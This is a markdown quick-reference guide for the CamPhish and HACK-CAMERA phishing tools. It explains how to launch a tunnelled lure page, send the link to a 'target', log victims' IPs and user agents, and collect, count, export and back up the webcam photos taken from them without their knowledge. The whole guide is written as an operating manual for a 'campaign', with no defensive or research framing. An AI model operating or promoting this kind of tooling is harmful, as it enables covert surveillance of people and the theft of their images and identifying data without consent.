# 🎯 QUICK REFERENCE GUIDE - CamN Fixes

## ⚡ Quick Start

### Generate & Share Link
```bash
# CamPhish V1 (Serveo)
cd CamPhish && bash camphish.sh

# HACK-CAMERA V2 (Ngrok)
cd HACK-CAMERA && bash hack_camera.sh
```

### Monitor Results in Real-Time
```bash
# Run the monitor script
bash log_monitor.sh
```

---

## 📊 LOG FILES LOCATION

| Log Type | File | Content |
|----------|------|---------|
| **IP Readable** | `ip.txt` | Human-readable IP logs |
| **IP Machine** | `ip.json` | Structured IP data |
| **Captures** | `Log.log` | Capture activity log |
| **Captures Data** | `captures.json` | Structured capture data |
| **Images** | `cam_*.png` | Actual photo files |

---

## 🔍 VIEWING LOGS

### View IP Log (Pretty)
```bash
cat CamPhish/ip.txt
```
**Output:**
```
======================================================================
[2026-02-03 15:30:45] Target Opened Link
IP ADDRESS: 192.168.1.100
USER-AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
======================================================================
```

### View IP Log (JSON)
```bash
# Using jq (formatted)
cat CamPhish/ip.json | jq '.'

# Without jq (raw)
cat CamPhish/ip.json
```
**Output:**
```json
[
  {
    "timestamp": "2026-02-03 15:30:45",
    "ip": "192.168.1.100",
    "user_agent": "Mozilla/5.0...",
    "action": "link_opened"
  }
]
```

### View Captures Log
```bash
cat CamPhish/Log.log
```

### View Capture Details (JSON)
```bash
cat CamPhish/captures.json | jq '.'
```

---

## 🎁 NEW FEATURES

### 1. Preview Mode
Add `?debug` to your link to see status:
```
http://your-link.com/?debug
```
Shows:
- ✓ Link status
- 📍 IP tracker active
- ⏰ Current timestamp

### 2. JSON Logging
All data automatically saved as JSON:
- Easy to parse programmatically
- Better for automation
- Machine-readable format

### 3. Structured Timestamps
Every activity has clear timestamp:
- Format: `YYYY-MM-DD HH:MM:SS`
- Easy to correlate events
- Better debugging

### 4. File Size Tracking
Camera captures include:
- Filename
- File size in bytes
- Timestamp

---

## 💡 TIPS & TRICKS

### Extract All IPs
```bash
# Linux/Mac
cat CamPhish/ip.json | jq -r '.[].ip'

# Windows PowerShell
(Get-Content CamPhish/ip.json | ConvertFrom-Json) | ForEach-Object { $_.ip }
```

### Count Successful Captures
```bash
# Using grep
grep -c "SUCCESS" CamPhish/Log.log

# Using jq
cat CamPhish/captures.json | jq 'length'
```

### Export Results
```bash
# Use monitor script option [7]
bash log_monitor.sh

# Or manually
mkdir logs_backup
cp CamPhish/*.txt logs_backup/
cp CamPhish/*.json logs_backup/
cp CamPhish/*.png logs_backup/
```

### Clean Old Files
```bash
# Delete images older than 7 days
find CamPhish -name "cam*.png" -mtime +7 -delete

# Or use monitor script option [8]
bash log_monitor.sh
```

---

## 🚨 TROUBLESHOOTING

| Problem | Solution |
|---------|----------|
| **No IP logged** | Check `ip.php` included in your page |
| **JSON not created** | Will auto-create on first activity |
| **File permissions error** | Check folder write permissions: `chmod 777 folder` |
| **Preview mode not working** | Use exactly: `http://link/?debug` |
| **Too many old images** | Run cleanup: `bash log_monitor.sh` → option 8 |

---

## 📈 STATISTICS

### Check Capture Count
```bash
ls -1 CamPhish/cam*.png | wc -l
```

### Check Data Size
```bash
# Total image data
du -sh CamPhish/

# Individual file
ls -lh CamPhish/cam*.png | awk '{print $9, $5}'
```

### Recent Activity (Last 10)
```bash
# Last IPs
tail -20 CamPhish/ip.json | grep -o '"timestamp.*"'

# Last captures
tail -20 CamPhish/captures.json | grep -o '"filename.*"'
```

---

## ✅ VERIFICATION CHECKLIST

After running a campaign:

- [ ] Check `ip.txt` for target IPs
- [ ] Verify `ip.json` is structured
- [ ] Review `Log.log` for captures
- [ ] Count images in `captures.json`
- [ ] View captured photos
- [ ] Export to backup location
- [ ] Clean old files if needed

---

## 🔄 WORKFLOW EXAMPLE

```bash
# 1. Start server
cd CamPhish
bash camphish.sh

# 2. Select template (Festival/YouTube/Meeting)
# 3. Get link from server

# 4. Monitor in another terminal
bash log_monitor.sh
# Select option [6] to see last activities

# 5. When done, export results
# Select option [7] to export all

# 6. Check backup folder
ls logs_export_20260203_154500/
```

---

## 🔐 FILES TO MONITOR

**Critical Log Files:**
- `ip.json` - Contains all target IPs
- `captures.json` - Contains all captures metadata
- `cam_*.png` - Actual image files

**Backup Regularly:**
```bash
# Daily backup
tar -czf backup_$(date +%Y%m%d).tar.gz CamPhish/ip.* CamPhish/cam*.png
```

---

## 📚 RELATED FILES

- `FIX_DOCUMENTATION.md` - Detailed technical docs
- `log_monitor.sh` - Log monitoring script
- `QUICK_REF.md` - Original quick reference

---

**Last Updated:** 2026-02-03  
**Status:** ✅ Production Ready
